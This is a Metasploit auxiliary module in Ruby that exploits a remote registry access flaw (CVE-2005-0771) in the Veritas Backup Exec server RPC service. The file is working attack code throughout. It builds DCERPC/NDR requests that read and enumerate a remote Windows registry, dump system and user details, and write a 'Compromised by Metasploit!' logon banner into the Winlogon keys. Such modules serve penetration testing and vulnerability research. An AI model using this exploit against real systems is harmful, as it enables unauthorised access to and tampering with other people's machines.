##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Veritas Backup Exec Server Registry Access',
      'Description'    => %q{
        This modules exploits a remote registry access flaw in the BackupExec Windows
      Server RPC service. This vulnerability was discovered by Pedram Amini and is based
      on the NDR stub information posted to openrce.org.
      Please see the action list for the different attack modes.

      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '17627' ],
          [ 'CVE', '2005-0771' ],
          [ 'URL', 'http://www.idefense.com/application/poi/display?id=269&type=vulnerabilities'],
        ],
      'Actions'     =>
        [
          ['System Information'],
          ['Create Logon Notice']
        ],
      'DefaultAction' => 'System Information'
      ))

      register_options(
        [
          Opt::RPORT(6106),
          OptString.new('WARN',
            [
              false,
              "The warning to display for the Logon Notice action",
              "Compromised by Metasploit!\r\n"
            ]
          ),
        ])
  end

  def auxiliary_commands
    return {
      "regread" => "Read a registry value",
      # "regenum" => "Enumerate registry keys",
    }
  end

  def run
    case action.name
      when 'System Information'
        system_info()
      when 'Create Logon Notice'
        logon_notice()
    end
  end


  def cmd_regread(*args)

    if (args.length == 0)
      print_status("Usage: regread HKLM\\\\Hardware\\\\Description\\\\System\\\\SystemBIOSVersion")
      return
    end

    paths  = args[0].split("\\")
    hive   = paths.shift
    subval = paths.pop
    subkey = paths.join("\\")
    data   = backupexec_regread(hive, subkey, subval)

    if (data)
      print_status("DATA: #{deunicode(data)}")
    else
      print_error("Failed to read #{hive}\\#{subkey}\\#{subval}...")
    end

  end

  def cmd_regenum(*args)

    if (args.length == 0)
      print_status("Usage: regenum HKLM\\\\Software")
      return
    end

    paths  = args[0].split("\\")
    hive   = paths.shift
    subkey = "\\" + paths.join("\\")
    data   = backupexec_regenum(hive, subkey)

    if (data)
      print_status("DATA: #{deunicode(data)}")
    else
      print_error("Failed to enumerate #{hive}\\#{subkey}...")
    end

  end

  def system_info
    print_status("Dumping system information...")

    prod_id   = backupexec_regread('HKLM', 'Software\\Microsoft\\Windows\\CurrentVersion', 'ProductId') || 'Unknown'
    prod_name = backupexec_regread('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName') || 'Windows (Unknown)'
    prod_sp   = backupexec_regread('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'CSDVersion') || 'No Service Pack'
    owner     = backupexec_regread('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'RegisteredOwner') || 'Unknown Owner'
    company   = backupexec_regread('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'RegisteredOrganization') || 'Unknown Company'
    cpu       = backupexec_regread('HKLM', 'Hardware\\Description\\System\\CentralProcessor\\0', 'ProcessorNameString') || 'Unknown CPU'
    username  = backupexec_regread('HKCU', 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer', 'Logon User Name') || 'SYSTEM'

    print_status("The current interactive user is #{deunicode(username)}")
    print_status("The operating system is #{deunicode(prod_name)} #{deunicode(prod_sp)} (#{deunicode(prod_id)})")
    print_status("The system is registered to #{deunicode(owner)} of #{deunicode(company)}")
    print_status("The system runs on a #{deunicode(cpu)}")
  end

  def logon_notice
    print_status("Setting the logon warning to #{datastore['WARN'].strip}...")
    backupexec_regwrite('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'LegalNoticeText',  REG_SZ, datastore['WARN'])
    backupexec_regwrite('HKLM', 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'LegalNoticeCaption',  REG_SZ, 'METASPLOIT')
  end


  def deunicode(str)
    str.gsub(/\x00/, '').strip
  end

  #
  # Write a registry key
  #
  def backupexec_regwrite(hive, subkey, subval, type, data)
    stub = backupexec_regrpc_write(
      :hive => registry_hive_lookup(hive),
      :subkey => subkey,
      :subval => subval,
      :type => type,
      :data => data
    )
    resp = backupexec_regrpc_call(5, stub)
    return false if resp.length == 0
    return true
  end

  #
  # Read a registry key
  #
  def backupexec_regread(hive, subkey, subval, type = REG_SZ)
    stub = backupexec_regrpc_read(
      :hive => registry_hive_lookup(hive),
      :subkey => subkey,
      :subval => subval,
      :type => type
    )
    resp = backupexec_regrpc_call(4, stub)

    return nil if resp.length == 0
    ret, len = resp[0,8].unpack('VV')
    return nil if ret == 0
    return nil if len == 0
    return resp[8, len]
  end

  #
  # Enumerate a registry key
  #
  def backupexec_regenum(hive, subkey)
    stub = backupexec_regrpc_enum(
      :hive => registry_hive_lookup(hive),
      :subkey => subkey
    )
    resp = backupexec_regrpc_call(7, stub)
    p resp

    return nil if resp.length == 0
    ret, len = resp[0,8].unpack('VV')
    return nil if ret == 0
    return nil if len == 0
    return resp[8, len]
  end

  #
  # Call the backupexec registry service
  #
  def backupexec_regrpc_call(opnum, data = '')

    handle = dcerpc_handle(
      '93841fd0-16ce-11ce-850d-02608c44967b', '1.0',
      'ncacn_ip_tcp', [datastore['RPORT']]
    )

    dcerpc_bind(handle)

    resp = dcerpc.call(opnum, data)
    outp = ''

    if (dcerpc.last_response and dcerpc.last_response.stub_data)
      outp = dcerpc.last_response.stub_data
    end

    disconnect

    outp
  end

  # RPC Service 4
  def backupexec_regrpc_read(opts = {})
    subkey = opts[:subkey] || ''
    subval = opts[:subval] || ''
    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE
    type   = opts[:type]   || REG_SZ

    stub =
      NDR.UnicodeConformantVaryingString(subkey) +
      NDR.UnicodeConformantVaryingString(subval) +
      NDR.long(type) +
      NDR.long(1024) +
      NDR.long(0) +
      NDR.long(4) +
      NDR.long(4) +
      NDR.long(hive)
    return stub
  end

  # RPC Service 7
  def backupexec_regrpc_enum(opts = {})
    subkey = opts[:subkey] || ''
    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE
    stub =
      NDR.UnicodeConformantVaryingString(subkey) +
      NDR.long(4096) +
      NDR.long(0) +
      NDR.long(4) +
      NDR.long(4) +
      NDR.long(hive)
    return stub
  end

  # RPC Service 5
  def backupexec_regrpc_write(opts = {})
    subkey = opts[:subkey] || ''
    subval = opts[:subval] || ''
    hive   = opts[:hive]   || HKEY_LOCAL_MACHINE
    type   = opts[:type]   || REG_SZ
    data   = opts[:data]   || ''

    if (type == REG_SZ || type == REG_EXPAND_SZ)
      data = Rex::Text.to_unicode(data+"\x00")
    end

    stub =
      NDR.UnicodeConformantVaryingString(subkey) +
      NDR.UnicodeConformantVaryingString(subval) +
      NDR.long(type) +
      NDR.long(data.length) +
      NDR.long(data.length) +
      data +
      NDR.align(data) +
      NDR.long(4) +
      NDR.long(4) +
      NDR.long(hive)
    return stub
  end
end
